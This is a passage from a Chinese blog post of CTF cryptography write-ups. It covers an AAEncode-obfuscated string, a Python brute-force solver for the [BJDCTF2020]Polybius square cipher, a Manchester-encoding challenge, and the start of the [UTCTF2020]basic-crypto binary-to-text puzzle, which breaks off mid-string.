+(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210720144305920.png" alt></p>
<h3 id="波利比奥斯方阵密码"><a href="#波利比奥斯方阵密码" class="headerlink" title="波利比奥斯方阵密码"></a>波利比奥斯方阵密码</h3><p><img src="/2021/05/28/CTF/image-20210726132638982.png" alt="波利比奥斯方阵密码"></p>
<h4 id="BJDCTF2020-Polybius"><a href="#BJDCTF2020-Polybius" class="headerlink" title="[BJDCTF2020]Polybius"></a>[BJDCTF2020]Polybius</h4><p>题目中给出的信息为</p>
<pre class="line-numbers language-none"><code class="language-none">密文：ouauuuoooeeaaiaeauieuooeeiea
hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ&#x3D;
flag:解出明文后，请加上BJD&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>将hint解base64之后得明文为<code>The length of this plaintext: 14</code></p>
<p>但是没有给出加密的表格，也就是棋盘密码中的棋盘，这就要一个个的碰撞，写出脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools
head <span class="token operator">=</span> <span class="token string">'aeiou'</span>
ciphertext <span class="token operator">=</span> <span class="token string">'ouauuuoooeeaaiaeauieuooeeiea'</span>
polybiusd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token comment"># 创建波利比奥斯方阵</span>
<span class="token keyword">def</span> <span class="token function">polybius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">and</span> j <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
                flag <span class="token operator">=</span> <span class="token number">0</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>polybiusd<span class="token punctuation">)</span>

<span class="token comment"># 利用itertools.permutations()对字典进行全排列的性质进行字典的创建</span>
<span class="token keyword">def</span> <span class="token function">listall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    headlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    x <span class="token operator">=</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>
        temp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        headlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> headlist<span class="token punctuation">:</span>
        tmp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            tmp<span class="token punctuation">[</span>i<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> j
        dic<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span>
    <span class="token keyword">return</span> dic

<span class="token keyword">def</span> <span class="token function">PolybiusSolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 创建方阵</span>
    polybius<span class="token punctuation">(</span><span class="token punctuation">)</span>
    dic <span class="token operator">=</span> listall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
        plaintext <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            plaintext <span class="token operator">+=</span> polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">[</span>ciphertext<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span>ciphertext<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>


PolybiusSolve<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># flagi\jspolybi\jus</span>
<span class="token comment"># flagispolybius</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>没有将i和j单独分开是因为会造成很多麻烦，所以这里要根据”语境”对是’i’或’j’来进行研判。</p>
<h3 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h3><h4 id="BJDCTF2020-编码与调制"><a href="#BJDCTF2020-编码与调制" class="headerlink" title="[BJDCTF2020]编码与调制"></a>[BJDCTF2020]编码与调制</h4><p><strong>TAG: 曼彻斯特编码</strong></p>
<p><img src="/2021/05/28/CTF/image-20210727124821706.png" alt></p>
<p>使用下载的软件解，按步骤进行即可，最后解码得出的十六进制为</p>
<pre class="line-numbers language-none"><code class="language-none">024A447B4469664D616E63686573746572636F64657D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210727125204272.png" alt></p>
<p>再在线解一下即得flag</p>
<h3 id="复杂古典密码"><a href="#复杂古典密码" class="headerlink" title="复杂古典密码"></a>复杂古典密码</h3><blockquote>
<p>所谓复杂，也不过就是多了几层套娃而已，近年来的套娃与爆破之风愈演愈烈，固而有此分类。</p>
</blockquote>
<h4 id="UTCTF2020-basic-crypto"><a href="#UTCTF2020-basic-crypto" class="headerlink" title="[UTCTF2020]basic-crypto"></a>[UTCTF2020]basic-crypto</h4><p>写个简单脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

t <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token triple-quoted-string string">"""01010101 01101000 00101101 01101111 01101000 00101100 00100000 
01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 01101011 01100101 00100000 01110111 01100101 
00100000 01101000 01100001 01110110 01100101 00100000 01100001 01101110 01101111 01110100 01101000 01100101 01110010 
00100000 01100010 01101100 01101111 01100011 01101011 00100000 01101111 01100110 00100000 01110100 01100101 01111000 
01110100 00101100 00100000 01110111 01101001 01110100 01101000 00100000 01110011 01101111 01101101 01100101 00100000 
01110011 01101111 01110010 01110100 00100000 01101111 01100110 00100000 01110011 01110000 01100101 01100011 01101001 
01100001 01101100 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00101110 00100000 
01000011 01100001 01101110 00100000 01111001 01101111 01110101 00100000 01100110 01101001 01100111 01110101 01110010 
01100101 00100000 01101111 01110101 01110100 00100000 01110111 01101000 01100001 01110100 00100000 01110100 01101000 
01101001 01110011 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 01101001 
01110011 00111111 00100000 00101000 01101000 01101001 01101110 01110100 00111010 00100000 01101001 01100110 00100000 
01111001 01101111 01110101 00100000 01101100 01101111 01101111 01101011 00100000 01100011 01100001 01110010 01100101 
01100110 01110101 01101100 01101100 01111001 00101100 00100000 01111001 01101111 01110101 00100111 01101100 01101100 
00100000 01101110 01101111 01110100 01101001 01100011 01100101 00100000 01110100 01101000 01100001 01110100 00100000 
01110100 01101000 01100101 01110010 01100101 00100000 01101111 01101110 01101100 01111001 00100000 01100011 01101000 
01100001 01110010 01100001 01100011 01110100 01100101 01110010 01110011 00100000 01110000 01110010 01100101 01110011 
01100101 01101110 01110100 00100000 01100001 01110010 01100101 00100000 01000001 00101101 01011010 00101100 00100000 
01100001 00101101 01111010 00101100 00100000 00110000 00101101 00111001 00101100 00100000 01100001 01101110 01100100 
00100000 01110011 01101111 01101101 01100101 01110100 01101001 01101101 01100101 01110011 00100000 00101111 00100000 
01100001 01101110 01100100 00100000 00101011 00101110 00100000 01010011 01100101 01100101 00100000 01101001 01100110 
00100000 01111001 01101111 01110101 00100000 01100011 01100001 01101110 00100000 01100110 01101001 01101110 01100100 
00100000 01100001 01101110 00100000 01100101 01101110 01100011 01101111 01100100 01101001 01101110 01100111 00100000 
01110100 01101000 01100001 01110100 00100000 01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 
01101011 01100101 00100000 01110100 01101000 01101001 01110011 00100000 01101111 01101110 01100101 00101110 00101001 
00001010 01010100 01101101 01010110 00110011 01001001 01000111 01001110 01101111 01011001 01010111 01111000 01110011 
01011010 01010111 00110101 01101110 01011010 01010011 01000101 01100111 01010001 00110010 01000110 01110101 01001001 
01001000 01101100 01110110 01100100 01010011 01000010 01101101 01100001 01010111 01100100 00110001 01100011 01101101 
01010101 01100111 01100010 00110011 01010110 00110000 01001001 01001000 01100100 01101111 01011001 01011000 01010001 
01101110 01100011 01111001 01000010 01101110 01100010 00110010 01101100 01110101 01011010 01111001 01000010 01110110 
01100010 01101001 01000010 01101111 01011010 01011000 01001010 01101100 01010000 01111001 01000010 01001010 01100100 
01000011 01000010 01110011 01100010 00110010 00111001 01110010 01100011 01111001 01000010 01110011 01100001 01010111 
01110100 01101100 01001001 01001000 01010010 01101111 01011010 01010011 01000010 01110011 01011010 01011000 01010010 
00110000 01011010 01011000 01001010 01111010 01001001 01000111 01000110 01111001 01011010 01010011 01000010 01111010 
01100001 01000111 01101100 01101101 01100100 01000111 01010110 01101011 01001001 01000111 01001010 00110101 01001001 
01001000 01001110 01110110 01100010 01010111 01010101 01100111 01011001 00110010 00111001 01110101 01100011 00110011 
01010010 01101000 01100010 01101110 01010001 01110101 01001001 01000011 01101000 01101111 01100001 01010111 00110101 
00110000 01001111 01101001 01000010 00110101 01100010 00110011 01010101 01100111 01100010 01010111 01101100 01101110 
01100001 01001000 01010001 01100111 01100100 00110010 01000110 01110101 01100100 01000011 01000010 00110000 01100010 
01111001 01000010 01111010 01100100 01000111 01000110 01111001 01100100 01000011 01000010 01110011 01100010 00110010 
00111001 01110010 01100001 01010111 00110101 01101110 01001001 01001000 01010110 01110111 01001001 01000110 01001010 
01110110 01100010 01010111 01000110 01110101 01001001 01001000 01000010 01101100 01100010 00110011 01000010 01110011 
01011010 01010011 01101011 01110101 01000011 01101101 01110100 00110010 01011001 01101110 01001110 01111000 01100011 
01101101 01010001 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01100100 01101001 01100010 01111001 
01000010 01110010 01100100 01101110 01100100 00110101 01011001 00110010 01010001 01100111 01011010 01001000 01001010 
01110110 01011001 01101101 00111000 01101000 01001001 01000110 01101000 00110101 01011010 01111001 01000010 01110111 
01100101 01010111 01001001 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 01111010 01100101 
01000111 01110100 00110010 01001001 01000011 01101000 01110010 01100101 01000111 00110100 01100111 01100100 00110010 
01110100 01110000 01100010 01000111 00111000 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01001010 
01110010 01011001 01101101 00110101 01110110 01011001 00110010 01010001 01110101 01001100 01101001 00110100 01110000 
01001001 01001000 01110000 01110010 01011001 01101101 01010001 00110110 01001001 01000111 01110011 01100111 01011001 
00110010 01010110 01110011 01011001 00110010 01010010 01111010 01011010 01000111 01010110 01101011 01100011 00110011 
01101100 00110100 01001001 01000111 00110001 01111010 01100101 01101110 01001010 01110110 01011001 01101001 00110100 
01100111 01010101 00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01001000 01000010 00110101 
01100100 01101110 01011010 00110101 01011010 00110011 01001110 00110100 01100011 01010011 01000010 01101011 01100010 
00110010 01101000 01101011 01001100 01000011 01000010 01010100 01001010 00110010 01011010 01110110 01001001 01000111 
01010010 01110010 01100100 01010111 00111001 00110100 01001001 01001000 01100100 01110000 01001001 01001000 01100100 
01110110 01011001 00110010 01001110 01110010 01100011 01010111 00111000 01100111 01100001 00110011 01101000 01110101 
01001001 01000111 01001010 01110110 01100101 01101110 01011010 01110010 01100010 01010111 00111001 01110101 01001001 
01000111 00111001 01101101 01100010 00110010 01001010 01110000 01001001 01000111 01110100 00110010 01100101 01101110 
01001010 01110010 01100010 01000111 00111001 01101011 01100011 00110010 00110000 01100111 01100010 01011000 01001010 
01110010 01011001 01101101 01110100 01110100 01011010 01000111 00111001 01101001 01001001 01000111 01100100 01111010 
01011010 01001000 01001001 01100111 01100001 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 
00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 01111001 
01000010 01101011 01100101 01010011 01000010 01110010 01001001 01000111 00110101 01111010 01100011 01001000 01000010 
01110110 01011001 01101101 00111001 00110100 01011010 01000011 01000010 01110100 01100011 01101101 01110100 01101001 
01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01001100 01010011 01000010 00110001 01100101 
01001000 01101100 01101110 01100101 01000011 01000010 01110010 01011001 01111001 01000010 01110010 01001001 01000111 
01001110 01101100 01100010 01000111 01001110 01101011 01100011 00110010 01010010 01101100 01011010 01001000 01001110 
00110101 01100101 01000011 01000010 01110100 01100011 00110011 01110000 01111001 01100010 00110010 01001001 01110101 
01001001 01000101 00110001 01110010 01100101 01000011 01000010 01110000 01100101 01010111 01010101 01100111 01100011 
01001000 01001110 00110100 01100010 01101001 01000010 01101011 01100011 01101101 00111000 01100111 01100011 01001000 
01001110 00110100 01100001 00110011 01011001 01100111 01100011 01001000 01011010 01110010 01100011 01010100 00111000 
01100111 01100011 01101110 01001110 00110100 01011010 01000100 01101111 01100111 01010010 00110010 00111000 01100111 
01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 
01000111 01010010 01111001 01100010 01111001 01000010 01110111 01100100 01101101 01110100 01111000 01001001 01001000 
01001110 01101010 01001001 01001000 01000110 00110101 01100011 00110011 01101000 01111000 01001001 01000111 01010010 
00110101 01001001 01000111 01111000 01110110 01001001 01001000 01101100 01110111 01001001 01000111 01010010 01111001 
01100010 01111001 01000010 01110111 01100101 01010111 01001010 00110011 01100001 00110010 01010001 01100111 01011010 
01010111 01010010 01110111 01100100 01101101 01110100 01111000 01100101 01111001 00110100 01110101 01001100 01101110 
00110000 01100111 01001100 01010011 01000010 01101110 01100011 01101110 01001110 01110100 01100011 01101001 01000010 
00110011 01100010 00110010 01110100 00110100 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 
01001001 01001000 01001110 01110111 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01101010 01100010 
00110010 00111000 01100111 01011010 01001000 01001010 01110010 01011010 01000011 01000010 00110110 01100001 00110010 
01010010 01101011 01100010 00110010 01001010 00110100 01001100 01000011 01000010 01110000 01100101 01010111 01010101 
01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101110 01100011 01101101 01110100 01101011 
01001001 01000111 01010010 01111001 01100010 01111001 01000010 01110100 01100101 01010111 01001010 01101001 01100010 
00110010 01001110 00110110 01100101 01011000 01101000 01110101 01100010 00110011 01101000 01110100 01100010 00110010 
01001101 01100111 01100011 01001000 01101100 01101001 01001001 01000111 01010101 01110011 01001001 01000111 01010001 
01110011 01001001 01001000 01000001 01110011 01001001 01001000 01011001 01100111 01100001 01111001 01110111 01100111 
01100001 00110011 01101000 01110101 01001001 01001000 01000101 01100111 01100001 00110010 01001010 01110110 01001100 
01101001 01000010 01001010 01100101 01010111 01010101 01100111 01100010 01010111 01110100 00110100 01001001 01001000 
01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 01011010 01110000 01001001 01000111 01100100 
00110101 01011001 01101110 01010101 01100111 01100101 01010111 01010110 01101011 01001001 01000111 01010010 01111001 
01100010 01111001 01000010 01101001 01100010 00110011 01100100 01110010 01100011 00110011 01101000 01111010 01100101 
01001000 01000101 01100111 01100010 01011000 01001010 01110010 01011001 01101101 01110100 01110100 01011010 01000111 
00111001 01101001 01011001 01111001 01000010 01110011 01100001 01010011 01000010 01101001 01100010 00110011 01110000 
00110010 01100001 00110010 00110001 01111010 01100101 01001000 01000101 01100111 01011010 01001000 01001010 01110110 
01100100 01111001 01000010 01110010 01100101 01000111 00110100 01100111 01100011 00110011 01101000 01110111 01100010 
00110010 01001010 01101001 01100011 00110011 01101000 01111000 01001001 01000111 00110001 00110101 01100100 00110011 
01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 01001010 01110101 01011001 01111001 01000010 
01111010 01100101 01000011 01000010 01101011 01100011 01101101 00111000 01100111 01010100 00110011 01101000 01111000 
01100100 01101110 01001110 01101010 01100011 01101001 01000010 00110010 01100001 00110011 01101000 01111000 01011010 
01010111 01110100 01111000 01100010 01111001 00110100 01100111 01010011 00110011 01101000 00110101 01011010 01001000 
01001010 01110110 01011001 01101001 01000010 01111000 01011001 01101101 00111001 01110010 01011010 01000011 01000010 
00110011 01100010 00110010 01010010 01111001 01100101 01010111 00110100 01100111 01100011 00110010 01001101 01100111 
01011010 01001000 01101011 01100111 01011010 01010111 01001110 01110110 01001001 01001000 01000010 01101001 01100010 
00110010 01000110 01101100 01100010 00110011 01101000 01110100 01100001 01010011 01000010 01110010 01100101 01000111 
01110100 00110010 01100001 01010111 01001110 01111010 01011001 01111010 01101111 01100111 01011010 00110010 00111000 
01100111 01100100 01011000 01101000 00110101 01011010 01111001 01000010 01101011 01100011 01101101 01110100 01101011 
01001001 01000011 01100100 01110110 01001010 01111001 01000010 01101010 01100011 01101110 01101100 01101110 01011001 
01111001 01000010 01101100 01100101 01101001 01000010 00110011 01100101 01010111 01001110 01101011 01001001 01001000 
01101100 01110111 01011010 01000111 00111001 00110100 01001001 01001000 01001110 00110100 01001001 01000111 01010010 
01111001 01100010 01111001 01000010 01110010 01100100 01101110 01110000 01111001 01100001 00110010 01111000 01110110 
01011010 01000011 01110111 01100111 01011001 00110011 01101011 01100111 01011010 01001000 01001010 01110010 01011010 
01000011 01100100 01101010 01001001 01001000 01110000 01101001 01100101 01010111 01111000 01110010 01100010 01001000 
01011010 01110000 01001001 01000111 01010010 01111001 01100010 01111001 01000010 00110011 01100101 01010111 01001110 
01101011 01001001 01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01110100 
01100011 01101101 01110100 01101001 01100001 00110010 00110001 01101011 01100010 00110010 01001001 01100111 01100011 
00110011 01100111 01100111 01011010 01001000 01001010 01110110 01001001 01000111 01010010 01110110 01100001 01000111 
01010001 01110011 01001001 01001000 01000010 00110101 01100100 01101110 01011010 00110101 01011010 00110010 00111001 
01110101 01001001 01000111 01111000 01110000 01001001 01000011 01100100 01101011 01001010 01111001 01110111 01100111 
01100001 00110011 01101000 01110101 01001001 01000111 01001110 00110101 01001001 01001000 01101100 00110100 01001100 
01101001 01000010 01011010 01100101 01000111 00110001 01110110 01001001 01000111 01101100 00110101 01011010 01010011 
01000010 00110001 01100101 01001000 01101100 01101110 01001001 01000111 01110011 01100111 01100011 01000111 00111001 
01101110 01001001 01000111 00110001 01111001 01100001 00110010 01001010 01110010 01100010 01010111 01010010 01110110 
01011001 01101101 01001101 01110011 01001001 01000111 01101100 00110101 01011010 01010011 01000010 01110100 01100001 
00110011 01100111 01100111 01100011 00110011 01101000 01110111 01100010 00110010 01001001 01100111 01011010 01001000 
01001010 01110110 01001001 01000111 01001010 01110110 01011001 00110010 01010001 01100111 01100101 01011000 01000001 
01100111 01011010 01001000 01001010 01110110 01001001 01000111 01100100 00110101 01011001 01101101 00110101 01101010 
01001001 01000111 01111000 01110010 01011001 00110010 00111001 01110101 01001001 01001000 01101100 00110100 01001001 
01000111 00110001 00110101 01100100 00110011 01100100 00110101 01100101 01000011 01000010 01101110 01100101 01010111 
01001010 01110101 01011001 01111001 01000010 01101011 01100011 01101101 01110100 01101011 01001001 01000111 01001110 
01111001 01100101 01010111 01100011 01100111 01011010 01011000 01101111 01100111 01100011 00110011 01100111 01100111 
01011010 01001000 01001010 01110110 01001001 01000101 00111001 00110100 01100011 01011000 01011010 01111010 01011001 
00110011 01001001 01100111 01100100 01101101 01110100 00110100 01100011 01010111 01010110 01110010 01100011 01010111 
00111000 01110101 01000011 01101110 01001010 01101110 01100001 01000111 00110101 00110100 01100011 00110010 01010010 
01101101 01100101 01011000 01001110 01101011 01100100 01000111 01100100 01101111 01100100 01010011 01000101 01100111 
01100011 01010111 01100100 01101101 01001001 01000111 01101100 01111010 01011001 01010111 01110011 01100111 01011001 
00110011 01010010 01101111 01100100 01001000 01010110 01110000 01100001 00110010 01010101 01100111 01011010 01000111 
01101100 01110010 01001001 01001000 01110000 01110010 01100010 01101110 01010010 01101111 01100001 01000111 01110100 
00110100 01001001 01001000 01001010 00110100 01100011 01010111 01111000 01101011 01011010 00110010 00110101 00110100 
01100011 00110010 01111000 01110000 01100011 01010011 01000010 01111001 01100001 01011000 01001110 00110101 01100101 
